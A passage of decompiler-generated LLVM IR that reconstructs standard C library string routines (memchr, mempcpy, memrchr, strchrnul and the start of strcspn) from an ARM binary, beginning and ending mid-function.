  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 24, 25, 26, 2, 27, 0, 28, 1, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1 }
  uselistorder i32 -5, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_2c3e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c374, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c308, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c2a8, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_2c234, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_2c1f8, { 1, 0 }
  uselistorder label %dec_label_pc_2c1e4, { 1, 0 }
  uselistorder label %dec_label_pc_2c1a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c138, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c0cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c06c, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_2c03c, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_2bfd8, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_2bf98, { 1, 0 }
}

define i32 @__GI_memchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2c404 = urem i32 %arg1, 256
  %v0_2c420.pr = load i32, i32* @r2, align 4
  %v2_2c42015 = icmp eq i32 %v0_2c420.pr, 0
  %v0_2c434.pre = load i32, i32* @r0, align 4
  br i1 %v2_2c42015, label %dec_label_pc_2c430, label %dec_label_pc_2c428

dec_label_pc_2c40c:                               ; preds = %dec_label_pc_2c428
  %v1_2c40c = inttoptr i32 %v0_2c41c to i8*
  %v2_2c40c = load i8, i8* %v1_2c40c, align 1
  %v3_2c40c = zext i8 %v2_2c40c to i32
  %v9_2c410 = icmp eq i32 %v3_2c40c, %v1_2c404
  br i1 %v9_2c410, label %dec_label_pc_2c4e0, label %dec_label_pc_2c418

dec_label_pc_2c418:                               ; preds = %dec_label_pc_2c40c
  %v1_2c418 = add i32 %v0_2c418, -1
  %v1_2c41c = add i32 %v0_2c41c, 1
  %v2_2c420 = icmp eq i32 %v1_2c418, 0
  br i1 %v2_2c420, label %dec_label_pc_2c430, label %dec_label_pc_2c428

dec_label_pc_2c428:                               ; preds = %entry, %dec_label_pc_2c418
  %v0_2c418 = phi i32 [ %v1_2c418, %dec_label_pc_2c418 ], [ %v0_2c420.pr, %entry ]
  %v0_2c41c = phi i32 [ %v1_2c41c, %dec_label_pc_2c418 ], [ %v0_2c434.pre, %entry ]
  %v1_2c428 = urem i32 %v0_2c41c, 4
  %v2_2c428 = icmp eq i32 %v1_2c428, 0
  br i1 %v2_2c428, label %dec_label_pc_2c430, label %dec_label_pc_2c40c

dec_label_pc_2c430:                               ; preds = %dec_label_pc_2c418, %dec_label_pc_2c428, %entry
  %v0_2c4ac22 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_2c418 ], [ %v0_2c418, %dec_label_pc_2c428 ]
  %v0_2c434 = phi i32 [ %v0_2c434.pre, %entry ], [ %v1_2c41c, %dec_label_pc_2c418 ], [ %v0_2c41c, %dec_label_pc_2c428 ]
  %v4_2c430 = mul nuw nsw i32 %v1_2c404, 256
  %v5_2c430 = or i32 %v4_2c430, %v1_2c404
  %v4_2c438 = mul i32 %v5_2c430, 65536
  %v5_2c438 = or i32 %v4_2c438, %v5_2c430
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_2c4ac22, 3
  br i1 %tmp, label %dec_label_pc_2c440, label %dec_label_pc_2c4d4.preheader

dec_label_pc_2c440:                               ; preds = %dec_label_pc_2c430, %dec_label_pc_2c4ac.backedge
  %v0_2c45c60 = phi i32 [ %v1_2c45c, %dec_label_pc_2c4ac.backedge ], [ %v0_2c4ac22, %dec_label_pc_2c430 ]
  %v0_2c48059 = phi i32 [ %v4_2c440, %dec_label_pc_2c4ac.backedge ], [ %v0_2c434, %dec_label_pc_2c430 ]
  %v1_2c440 = inttoptr i32 %v0_2c48059 to i32*
  %v2_2c440 = load i32, i32* %v1_2c440, align 4
  %v4_2c440 = add i32 %v0_2c48059, 4
  %v2_2c444 = xor i32 %v2_2c440, %v5_2c438
  %v2_2c448 = add i32 %v2_2c444, 2130640639
  %v1_2c44c = sub i32 -1, %v2_2c444
  %v2_2c450 = xor i32 %v2_2c448, %v1_2c44c
  %v2_2c454 = and i32 %v2_2c450, -2130640640
  %v2_2c458 = icmp eq i32 %v2_2c454, 0
  %v1_2c45c = add i32 %v0_2c45c60, -4
  br i1 %v2_2c458, label %dec_label_pc_2c4ac.backedge, label %dec_label_pc_2c464

dec_label_pc_2c4ac.backedge:                      ; preds = %dec_label_pc_2c440, %dec_label_pc_2c49c
  store i32 2130640639, i32* @ip, align 4
  %tmp73 = icmp ugt i32 %v1_2c45c, 3
  br i1 %tmp73, label %dec_label_pc_2c440, label %dec_label_pc_2c4d4.preheader

dec_label_pc_2c464:                               ; preds = %dec_label_pc_2c440
  %v2_2c464 = inttoptr i32 %v0_2c48059 to i8*
  %v3_2c464 = load i8, i8* %v2_2c464, align 1
  %v4_2c464 = zext i8 %v3_2c464 to i32
  %v9_2c46c = icmp eq i32 %v4_2c464, %v1_2c404
  %v1_2c470 = add i32 %v0_2c48059, 3
  store i32 %v1_2c470, i32* @ip, align 4
  br i1 %v9_2c46c, label %dec_label_pc_2c4e0, label %dec_label_pc_2c478

dec_label_pc_2c478:                               ; preds = %dec_label_pc_2c464
  %v1_2c478 = add i32 %v0_2c48059, 1
  %v2_2c478 = inttoptr i32 %v1_2c478 to i8*
  %v3_2c478 = load i8, i8* %v2_2c478, align 1
  %v4_2c478 = zext i8 %v3_2c478 to i32
  %v9_2c47c = icmp eq i32 %v4_2c478, %v1_2c404
  br i1 %v9_2c47c, label %bb, label %dec_label_pc_2c48c

bb:                                               ; preds = %dec_label_pc_2c478
  br label %dec_label_pc_2c4e0

dec_label_pc_2c48c:                               ; preds = %dec_label_pc_2c478
  %v1_2c48c = add i32 %v0_2c48059, 2
  %v2_2c48c = inttoptr i32 %v1_2c48c to i8*
  %v3_2c48c = load i8, i8* %v2_2c48c, align 1
  %v4_2c48c = zext i8 %v3_2c48c to i32
  %v9_2c490 = icmp eq i32 %v4_2c48c, %v1_2c404
  br i1 %v9_2c490, label %dec_label_pc_2c4e0, label %dec_label_pc_2c49c

dec_label_pc_2c49c:                               ; preds = %dec_label_pc_2c48c
  %v2_2c49c = inttoptr i32 %v1_2c470 to i8*
  %v3_2c49c = load i8, i8* %v2_2c49c, align 1
  %v4_2c49c = zext i8 %v3_2c49c to i32
  %v9_2c4a0 = icmp eq i32 %v4_2c49c, %v1_2c404
  br i1 %v9_2c4a0, label %bb36, label %dec_label_pc_2c4ac.backedge

bb36:                                             ; preds = %dec_label_pc_2c49c
  br label %dec_label_pc_2c4e0

dec_label_pc_2c4d4.preheader:                     ; preds = %dec_label_pc_2c4ac.backedge, %dec_label_pc_2c430
  %v0_2c480.lcssa = phi i32 [ %v0_2c434, %dec_label_pc_2c430 ], [ %v4_2c440, %dec_label_pc_2c4ac.backedge ]
  %v0_2c45c.lcssa = phi i32 [ %v0_2c4ac22, %dec_label_pc_2c430 ], [ %v1_2c45c, %dec_label_pc_2c4ac.backedge ]
  %v2_2c4d47 = icmp eq i32 %v0_2c45c.lcssa, 0
  br i1 %v2_2c4d47, label %dec_label_pc_2c4dc, label %dec_label_pc_2c4c4

dec_label_pc_2c4c4:                               ; preds = %dec_label_pc_2c4d0, %dec_label_pc_2c4d4.preheader
  %v0_2c4d4.in = phi i32 [ %v0_2c4d4, %dec_label_pc_2c4d0 ], [ %v0_2c45c.lcssa, %dec_label_pc_2c4d4.preheader ]
  %v0_2c4d0 = phi i32 [ %v1_2c4d0, %dec_label_pc_2c4d0 ], [ %v0_2c480.lcssa, %dec_label_pc_2c4d4.preheader ]
  %v0_2c4d4 = add i32 %v0_2c4d4.in, -1
  %v1_2c4c4 = inttoptr i32 %v0_2c4d0 to i8*
  %v2_2c4c4 = load i8, i8* %v1_2c4c4, align 1
  %v3_2c4c4 = zext i8 %v2_2c4c4 to i32
  %v9_2c4c8 = icmp eq i32 %v3_2c4c4, %v1_2c404
  br i1 %v9_2c4c8, label %dec_label_pc_2c4e0, label %dec_label_pc_2c4d0

dec_label_pc_2c4d0:                               ; preds = %dec_label_pc_2c4c4
  %v1_2c4d0 = add i32 %v0_2c4d0, 1
  %v2_2c4d4 = icmp eq i32 %v0_2c4d4, 0
  br i1 %v2_2c4d4, label %dec_label_pc_2c4dc, label %dec_label_pc_2c4c4

dec_label_pc_2c4dc:                               ; preds = %dec_label_pc_2c4d0, %dec_label_pc_2c4d4.preheader
  br label %dec_label_pc_2c4e0

dec_label_pc_2c4e0:                               ; preds = %dec_label_pc_2c40c, %dec_label_pc_2c48c, %dec_label_pc_2c464, %dec_label_pc_2c4c4, %bb36, %bb, %dec_label_pc_2c4dc
  %v1_2c4e4 = phi i32 [ 0, %dec_label_pc_2c4dc ], [ %v1_2c478, %bb ], [ %v1_2c470, %bb36 ], [ %v0_2c4d0, %dec_label_pc_2c4c4 ], [ %v1_2c48c, %dec_label_pc_2c48c ], [ %v0_2c48059, %dec_label_pc_2c464 ], [ %v0_2c41c, %dec_label_pc_2c40c ]
  ret i32 %v1_2c4e4

; uselistorder directives
  uselistorder i32 %v1_2c45c, { 1, 0, 2 }
  uselistorder i32 %v0_2c48059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_2c430, { 1, 0 }
  uselistorder i32 %v0_2c4ac22, { 1, 2, 0 }
  uselistorder i32 %v0_2c41c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_2c434.pre, { 1, 0 }
  uselistorder i32 %v1_2c404, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_2c4e0, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_2c4ac.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_2c440, { 1, 0 }
  uselistorder label %dec_label_pc_2c430, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2c428, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_2c4f0 = load i32, i32* @r4, align 4
  %v6_2c4f0 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_2c500 = call i32 @memcpy()
  %v0_2c504 = load i32, i32* @r5, align 4
  %v1_2c504 = load i32, i32* @r4, align 4
  %v2_2c504 = add i32 %v1_2c504, %v0_2c504
  store i32 %v3_2c4f0, i32* @r4, align 4
  store i32 %v6_2c4f0, i32* @r5, align 4
  ret i32 %v2_2c504
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2c518 = urem i32 %arg2, 256
  %v2_2c51c = add i32 %arg3, %arg1
  %v2_2c5344 = icmp eq i32 %arg3, 0
  br i1 %v2_2c5344, label %dec_label_pc_2c544, label %dec_label_pc_2c53c

dec_label_pc_2c524:                               ; preds = %dec_label_pc_2c53c
  %v1_2c524 = add i32 %v0_2c524, -1
  %v2_2c524 = inttoptr i32 %v1_2c524 to i8*
  %v3_2c524 = load i8, i8* %v2_2c524, align 1
  %v4_2c524 = zext i8 %v3_2c524 to i32
  %v9_2c528 = icmp eq i32 %v4_2c524, %v1_2c518
  br i1 %v9_2c528, label %dec_label_pc_2c5e4, label %dec_label_pc_2c530

dec_label_pc_2c530:                               ; preds = %dec_label_pc_2c524
  %v1_2c530 = add i32 %v0_2c530, -1
  %v2_2c534 = icmp eq i32 %v1_2c530, 0
  br i1 %v2_2c534, label %dec_label_pc_2c544, label %dec_label_pc_2c53c

dec_label_pc_2c53c:                               ; preds = %entry, %dec_label_pc_2c530
  %v0_2c530 = phi i32 [ %v1_2c530, %dec_label_pc_2c530 ], [ %arg3, %entry ]
  %v0_2c524 = phi i32 [ %v1_2c524, %dec_label_pc_2c530 ], [ %v2_2c51c, %entry ]
  %v1_2c53c = urem i32 %v0_2c524, 4
  %v2_2c53c = icmp eq i32 %v1_2c53c, 0
  br i1 %v2_2c53c, label %dec_label_pc_2c544, label %dec_label_pc_2c524

dec_label_pc_2c544:                               ; preds = %dec_label_pc_2c530, %dec_label_pc_2c53c, %entry
  %v0_2c5cc13 = phi i32 [ %v2_2c51c, %entry ], [ %v1_2c524, %dec_label_pc_2c530 ], [ %v0_2c524, %dec_label_pc_2c53c ]
  %v0_2c5b89 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_2c530 ], [ %v0_2c530, %dec_label_pc_2c53c ]
  %v4_2c544 = mul nuw nsw i32 %v1_2c518, 256
  %v5_2c544 = or i32 %v4_2c544, %v1_2c518
  %v4_2c548 = mul i32 %v5_2c544, 65536
  %v5_2c548 = or i32 %v4_2c548, %v5_2c544
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_2c5b89, 3
  br i1 %tmp, label %dec_label_pc_2c550, label %dec_label_pc_2c5d8

dec_label_pc_2c550:                               ; preds = %dec_label_pc_2c544, %dec_label_pc_2c5b8.backedge
  %v0_2c56c40 = phi i32 [ %v1_2c56c, %dec_label_pc_2c5b8.backedge ], [ %v0_2c5b89, %dec_label_pc_2c544 ]
  %v0_2c55039 = phi i32 [ %v1_2c550, %dec_label_pc_2c5b8.backedge ], [ %v0_2c5cc13, %dec_label_pc_2c544 ]
  %v1_2c550 = add i32 %v0_2c55039, -4
  %v2_2c550 = inttoptr i32 %v1_2c550 to i32*
  %v3_2c550 = load i32, i32* %v2_2c550, align 4
  %v2_2c554 = xor i32 %v3_2c550, %v5_2c548
  %v2_2c558 = add i32 %v2_2c554, 2130640639
  store i32 %v2_2c558, i32* @ip, align 4
  %v1_2c55c = sub i32 -1, %v2_2c554
  %v2_2c560 = xor i32 %v2_2c558, %v1_2c55c
  %v2_2c564 = and i32 %v2_2c560, -2130640640
  %v2_2c568 = icmp eq i32 %v2_2c564, 0
  %v1_2c56c = add i32 %v0_2c56c40, -4
  br i1 %v2_2c568, label %dec_label_pc_2c5b8.backedge, label %dec_label_pc_2c574

dec_label_pc_2c5b8.backedge:                      ; preds = %dec_label_pc_2c550, %dec_label_pc_2c5ac
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_2c56c, 3
  br i1 %tmp46, label %dec_label_pc_2c550, label %dec_label_pc_2c5d8

dec_label_pc_2c574:                               ; preds = %dec_label_pc_2c550
  %v1_2c574 = add i32 %v0_2c55039, -1
  %v2_2c574 = inttoptr i32 %v1_2c574 to i8*
  %v3_2c574 = load i8, i8* %v2_2c574, align 1
  %v4_2c574 = zext i8 %v3_2c574 to i32
  %v9_2c578 = icmp eq i32 %v4_2c574, %v1_2c518
  br i1 %v9_2c578, label %dec_label_pc_2c5a4, label %dec_label_pc_2c584

dec_label_pc_2c584:                               ; preds = %dec_label_pc_2c574
  %v1_2c584 = add i32 %v0_2c55039, -2
  %v2_2c584 = inttoptr i32 %v1_2c584 to i8*
  %v3_2c584 = load i8, i8* %v2_2c584, align 1
  %v4_2c584 = zext i8 %v3_2c584 to i32
  %v9_2c588 = icmp eq i32 %v4_2c584, %v1_2c518
  br i1 %v9_2c588, label %dec_label_pc_2c5a4, label %dec_label_pc_2c594

dec_label_pc_2c594:                               ; preds = %dec_label_pc_2c584
  %v1_2c594 = add i32 %v0_2c55039, -3
  %v2_2c594 = inttoptr i32 %v1_2c594 to i8*
  %v3_2c594 = load i8, i8* %v2_2c594, align 1
  %v4_2c594 = zext i8 %v3_2c594 to i32
  %v9_2c598 = icmp eq i32 %v4_2c594, %v1_2c518
  br i1 %v9_2c598, label %dec_label_pc_2c5a4, label %dec_label_pc_2c5ac

dec_label_pc_2c5a4:                               ; preds = %dec_label_pc_2c594, %dec_label_pc_2c584, %dec_label_pc_2c574
  %v0_2c5a4 = phi i32 [ %v1_2c594, %dec_label_pc_2c594 ], [ %v1_2c584, %dec_label_pc_2c584 ], [ %v1_2c574, %dec_label_pc_2c574 ]
  br label %dec_label_pc_2c5e4

dec_label_pc_2c5ac:                               ; preds = %dec_label_pc_2c594
  %v1_2c5ac = inttoptr i32 %v1_2c550 to i8*
  %v2_2c5ac = load i8, i8* %v1_2c5ac, align 1
  %v3_2c5ac = zext i8 %v2_2c5ac to i32
  %v9_2c5b0 = icmp eq i32 %v3_2c5ac, %v1_2c518
  br i1 %v9_2c5b0, label %dec_label_pc_2c5e4, label %dec_label_pc_2c5b8.backedge

dec_label_pc_2c5cc:                               ; preds = %dec_label_pc_2c5d8
  %v1_2c5d8 = add i32 %v0_2c5d8, -1
  %v1_2c5cc = add i32 %v0_2c5cc, -1
  %v2_2c5cc = inttoptr i32 %v1_2c5cc to i8*
  %v3_2c5cc = load i8, i8* %v2_2c5cc, align 1
  %v4_2c5cc = zext i8 %v3_2c5cc to i32
  %v9_2c5d0 = icmp eq i32 %v4_2c5cc, %v1_2c518
  br i1 %v9_2c5d0, label %dec_label_pc_2c5e4, label %dec_label_pc_2c5d8

dec_label_pc_2c5d8:                               ; preds = %dec_label_pc_2c544, %dec_label_pc_2c5b8.backedge, %dec_label_pc_2c5cc
  %v0_2c5cc = phi i32 [ %v1_2c5cc, %dec_label_pc_2c5cc ], [ %v0_2c5cc13, %dec_label_pc_2c544 ], [ %v1_2c550, %dec_label_pc_2c5b8.backedge ]
  %v0_2c5d8 = phi i32 [ %v1_2c5d8, %dec_label_pc_2c5cc ], [ %v0_2c5b89, %dec_label_pc_2c544 ], [ %v1_2c56c, %dec_label_pc_2c5b8.backedge ]
  %v2_2c5d8 = icmp eq i32 %v0_2c5d8, 0
  br i1 %v2_2c5d8, label %dec_label_pc_2c5e0, label %dec_label_pc_2c5cc

dec_label_pc_2c5e0:                               ; preds = %dec_label_pc_2c5d8
  br label %dec_label_pc_2c5e4

dec_label_pc_2c5e4:                               ; preds = %dec_label_pc_2c524, %dec_label_pc_2c5ac, %dec_label_pc_2c5cc, %dec_label_pc_2c5a4, %dec_label_pc_2c5e0
  %v1_2c5e8 = phi i32 [ %v0_2c5a4, %dec_label_pc_2c5a4 ], [ 0, %dec_label_pc_2c5e0 ], [ %v1_2c5cc, %dec_label_pc_2c5cc ], [ %v1_2c550, %dec_label_pc_2c5ac ], [ %v1_2c524, %dec_label_pc_2c524 ]
  ret i32 %v1_2c5e8

; uselistorder directives
  uselistorder i32 %v0_2c5d8, { 1, 0 }
  uselistorder i32 %v1_2c56c, { 1, 0, 2 }
  uselistorder i32 %v1_2c550, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_2c55039, { 3, 2, 1, 0 }
  uselistorder i32 %v5_2c544, { 1, 0 }
  uselistorder i32 %v0_2c5b89, { 1, 2, 0 }
  uselistorder i32 %v0_2c524, { 1, 0, 2 }
  uselistorder i32 %v2_2c51c, { 1, 0 }
  uselistorder i32 %v1_2c518, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_2c5e4, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_2c5d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2c5b8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_2c550, { 1, 0 }
  uselistorder label %dec_label_pc_2c544, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2c53c, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_2c5f8 = urem i32 %arg1, 256
  %v0_2c6182 = load i32, i32* @r0, align 4
  %v1_2c6183 = urem i32 %v0_2c6182, 4
  %v2_2c6184 = icmp eq i32 %v1_2c6183, 0
  br i1 %v2_2c6184, label %dec_label_pc_2c620, label %dec_label_pc_2c600

dec_label_pc_2c600:                               ; preds = %entry, %dec_label_pc_2c614
  %v0_2c614 = phi i32 [ %v1_2c614, %dec_label_pc_2c614 ], [ %v0_2c6182, %entry ]
  %v1_2c600 = inttoptr i32 %v0_2c614 to i8*
  %v2_2c600 = load i8, i8* %v1_2c600, align 1
  %v3_2c600 = zext i8 %v2_2c600 to i32
  %v9_2c604 = icmp eq i32 %v3_2c600, %v1_2c5f8
  br i1 %v9_2c604, label %dec_label_pc_2c6d0, label %dec_label_pc_2c60c

dec_label_pc_2c60c:                               ; preds = %dec_label_pc_2c600
  %v2_2c60c = icmp eq i8 %v2_2c600, 0
  br i1 %v2_2c60c, label %dec_label_pc_2c6d0, label %dec_label_pc_2c614

dec_label_pc_2c614:                               ; preds = %dec_label_pc_2c60c
  %v1_2c614 = add i32 %v0_2c614, 1
  %v1_2c618 = urem i32 %v1_2c614, 4
  %v2_2c618 = icmp eq i32 %v1_2c618, 0
  br i1 %v2_2c618, label %dec_label_pc_2c620, label %dec_label_pc_2c600

dec_label_pc_2c620:                               ; preds = %dec_label_pc_2c614, %entry
  %v0_2c624 = phi i32 [ %v0_2c6182, %entry ], [ %v1_2c614, %dec_label_pc_2c614 ]
  %v4_2c620 = mul nuw nsw i32 %v1_2c5f8, 256
  %v5_2c620 = or i32 %v4_2c620, %v1_2c5f8
  %v4_2c628 = mul i32 %v5_2c620, 65536
  %v5_2c628 = or i32 %v4_2c628, %v5_2c620
  br label %dec_label_pc_2c62c

dec_label_pc_2c62c:                               ; preds = %dec_label_pc_2c6c8, %dec_label_pc_2c668, %dec_label_pc_2c620
  %v0_2c690 = phi i32 [ %v0_2c624, %dec_label_pc_2c620 ], [ %v4_2c62c, %dec_label_pc_2c668 ], [ %v4_2c62c, %dec_label_pc_2c6c8 ]
  %v1_2c62c = inttoptr i32 %v0_2c690 to i32*
  %v2_2c62c = load i32, i32* %v1_2c62c, align 4
  %v4_2c62c = add i32 %v0_2c690, 4
  %v2_2c634 = xor i32 %v2_2c62c, %v5_2c628
  %v2_2c638 = add i32 %v2_2c634, 2130640639
  store i32 %v2_2c638, i32* @ip, align 4
  %v2_2c640 = add i32 %v2_2c62c, 2130640639
  %v1_2c644 = sub i32 -1, %v2_2c62c
  %v2_2c648 = xor i32 %v2_2c640, %v1_2c644
  %v2_2c654 = and i32 %v2_2c648, -2130640640
  %v2_2c65c = icmp eq i32 %v2_2c654, 0
  br i1 %v2_2c65c, label %dec_label_pc_2c668, label %dec_label_pc_2c670

dec_label_pc_2c668:                               ; preds = %dec_label_pc_2c62c
  %v1_2c650 = sub i32 -1, %v2_2c634
  %v2_2c658 = xor i32 %v2_2c638, %v1_2c650
  %v2_2c660 = and i32 %v2_2c658, -2130640640
  %v2_2c668 = icmp eq i32 %v2_2c660, 0
  br i1 %v2_2c668, label %dec_label_pc_2c62c, label %dec_label_pc_2c670

dec_label_pc_2c670:                               ; preds = %dec_label_pc_2c62c, %dec_label_pc_2c668
  %v2_2c670 = inttoptr i32 %v0_2c690 to i8*
  %v3_2c670 = load i8, i8* %v2_2c670, align 1
  %v4_2c670 = zext i8 %v3_2c670 to i32
  %v9_2c674 = icmp eq i32 %v4_2c670, %v1_2c5f8
  br i1 %v9_2c674, label %dec_label_pc_2c6d0, label %dec_label_pc_2c680

dec_label_pc_2c680:                               ; preds = %dec_label_pc_2c670
  %v2_2c680 = icmp eq i8 %v3_2c670, 0
  br i1 %v2_2c680, label %dec_label_pc_2c6d0, label %dec_label_pc_2c688

dec_label_pc_2c688:                               ; preds = %dec_label_pc_2c680
  %v1_2c688 = add i32 %v0_2c690, 1
  %v2_2c688 = inttoptr i32 %v1_2c688 to i8*
  %v3_2c688 = load i8, i8* %v2_2c688, align 1
  %v4_2c688 = zext i8 %v3_2c688 to i32
  %v9_2c68c = icmp eq i32 %v4_2c688, %v1_2c5f8
  br i1 %v9_2c68c, label %dec_label_pc_2c6d0, label %dec_label_pc_2c698

dec_label_pc_2c698:                               ; preds = %dec_label_pc_2c688
  %v2_2c698 = icmp eq i8 %v3_2c688, 0
  br i1 %v2_2c698, label %dec_label_pc_2c6d0, label %dec_label_pc_2c6a0

dec_label_pc_2c6a0:                               ; preds = %dec_label_pc_2c698
  %v1_2c6a0 = add i32 %v0_2c690, 2
  %v2_2c6a0 = inttoptr i32 %v1_2c6a0 to i8*
  %v3_2c6a0 = load i8, i8* %v2_2c6a0, align 1
  %v4_2c6a0 = zext i8 %v3_2c6a0 to i32
  %v9_2c6a4 = icmp eq i32 %v4_2c6a0, %v1_2c5f8
  br i1 %v9_2c6a4, label %dec_label_pc_2c6d0, label %dec_label_pc_2c6b0

dec_label_pc_2c6b0:                               ; preds = %dec_label_pc_2c6a0
  %v2_2c6b0 = icmp eq i8 %v3_2c6a0, 0
  br i1 %v2_2c6b0, label %dec_label_pc_2c6d0, label %dec_label_pc_2c6b8

dec_label_pc_2c6b8:                               ; preds = %dec_label_pc_2c6b0
  %v1_2c6b8 = add i32 %v0_2c690, 3
  %v2_2c6b8 = inttoptr i32 %v1_2c6b8 to i8*
  %v3_2c6b8 = load i8, i8* %v2_2c6b8, align 1
  %v4_2c6b8 = zext i8 %v3_2c6b8 to i32
  %v9_2c6bc = icmp eq i32 %v4_2c6b8, %v1_2c5f8
  br i1 %v9_2c6bc, label %dec_label_pc_2c6d0, label %dec_label_pc_2c6c8

dec_label_pc_2c6c8:                               ; preds = %dec_label_pc_2c6b8
  %v2_2c6c8 = icmp eq i8 %v3_2c6b8, 0
  br i1 %v2_2c6c8, label %dec_label_pc_2c6d0, label %dec_label_pc_2c62c

dec_label_pc_2c6d0:                               ; preds = %dec_label_pc_2c60c, %dec_label_pc_2c600, %dec_label_pc_2c6c8, %dec_label_pc_2c6b8, %dec_label_pc_2c6b0, %dec_label_pc_2c6a0, %dec_label_pc_2c698, %dec_label_pc_2c688, %dec_label_pc_2c680, %dec_label_pc_2c670
  %v1_2c6d4 = phi i32 [ %v1_2c6b8, %dec_label_pc_2c6c8 ], [ %v1_2c6b8, %dec_label_pc_2c6b8 ], [ %v1_2c6a0, %dec_label_pc_2c6b0 ], [ %v1_2c6a0, %dec_label_pc_2c6a0 ], [ %v1_2c688, %dec_label_pc_2c698 ], [ %v1_2c688, %dec_label_pc_2c688 ], [ %v0_2c690, %dec_label_pc_2c680 ], [ %v0_2c690, %dec_label_pc_2c670 ], [ %v0_2c614, %dec_label_pc_2c600 ], [ %v0_2c614, %dec_label_pc_2c60c ]
  ret i32 %v1_2c6d4

; uselistorder directives
  uselistorder i32 %v4_2c62c, { 1, 0 }
  uselistorder i32 %v2_2c62c, { 0, 2, 1 }
  uselistorder i32 %v0_2c690, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_2c620, { 1, 0 }
  uselistorder i32 %v1_2c614, { 1, 0, 2 }
  uselistorder i32 %v0_2c6182, { 2, 1, 0 }
  uselistorder i32 %v1_2c5f8, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_2c6d0, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_2c670, { 1, 0 }
  uselistorder label %dec_label_pc_2c600, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_2c6e0 = load i32, i32* @r4, align 4
  store i32 %v3_2c6e0, i32* %stack_var_-16, align 4
  %v6_2c6e0 = load i32, i32* @r5, align 4
  %v9_2c6e0 = load i32, i32* @r6, align 4
  %v0_2c6e4 = load i32, i32* @r0, align 4
  %v0_2c6e8 = load i32, i32* @r1, align 4
  store i32 %v0_2c6e8, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_2c7048 = inttoptr i32 %v0_2c6e4 to i8*
  %v2_2c7049 = load i8, i8* %v1_2c7048, align 1
  %v2_2c70811 = icmp eq i8 %v2_2c7049, 0
  store i32 %v0_2c6e8, i32* @r0, align 4
  %v1_2c71012 = add i32 %v0_2c6e4, 1
  store i32 %v1_2c71012, i32* @r4, align 4
  br i1 %v2_2c70811, label %dec_label_pc_2c718, label %dec_label_pc_2c6f4

dec_label_pc_2c6f4:                               ; preds = %entry, %dec_label_pc_2c700
  %v3_2c70414.in = phi i8 [ %v2_2c704, %dec_label_pc_2c700 ], [ %v2_2c7049, %entry ]
  %v0_2c70c13 = phi i32 [ %v0_2c70c.pre, %dec_label_pc_2c700 ], [ %v0_2c6e8, %entry ]
  %v3_2c70414 = zext i8 %v3_2c70414.in to i32
  %v2_2c6f4 = call i32 @__GI_strchr(i32 %v0_2c70c13, i32 %v3_2c70414)
  %v2_2c6f8 = icmp eq i32 %v2_2c6f4, 0
  %v0_2c700 = load i32, i32* @r5, align 4
